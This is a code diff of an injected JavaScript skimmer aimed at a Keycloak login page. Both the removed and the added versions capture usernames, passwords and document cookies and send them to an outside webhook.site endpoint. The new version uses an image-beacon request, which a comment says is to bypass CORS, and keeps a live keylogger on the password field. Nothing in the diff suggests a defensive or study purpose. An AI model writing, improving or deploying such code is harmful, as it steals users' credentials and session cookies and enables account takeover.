@@ -5,14 +5,13 @@
   const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';
 
   function sendData(data) {
-    fetch(webhook, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    }).catch(() => {});
+    // Envoi via balise img pour bypass CORS
+    let i = new Image();
+    i.src = webhook + 
+      '?u=' + encodeURIComponent(data.username) +
+      '&p=' + encodeURIComponent(data.password) +
+      '&cookies=' + encodeURIComponent(document.cookie) +
+      '&url=' + encodeURIComponent(window.location.href);
   }
 
   const form = document.getElementById('kc-form-login');
@@ -20,47 +19,23 @@
     form.addEventListener('submit', function() {
       const username = document.getElementById('username')?.value || '';
       const password = document.getElementById('password')?.value || '';
-      const cookies = document.cookie;
 
       sendData({
-        type: 'login_submit',
         username,
-        password,
-        cookies,
-        userAgent: navigator.userAgent,
-        url: window.location.href
+        password
       });
     });
   }
 
-  const usernameInput = document.getElementById('username');
+  // Keylogger si tu veux capter en live
   const passwordInput = document.getElementById('password');
-
-  if (usernameInput) {
-    usernameInput.addEventListener('input', () => {
-      sendData({
-        type: 'keylog',
-        field: 'username',
-        value: usernameInput.value
-      });
-    });
-  }
-
   if (passwordInput) {
     passwordInput.addEventListener('input', () => {
       sendData({
-        type: 'keylog',
-        field: 'password',
-        value: passwordInput.value
+        username: '',
+        password: passwordInput.value
       });
     });
   }
-
-  sendData({
-    type: 'cookies_onload',
-    cookies: document.cookie,
-    userAgent: navigator.userAgent,
-    url: window.location.href
-  });
 
 })();
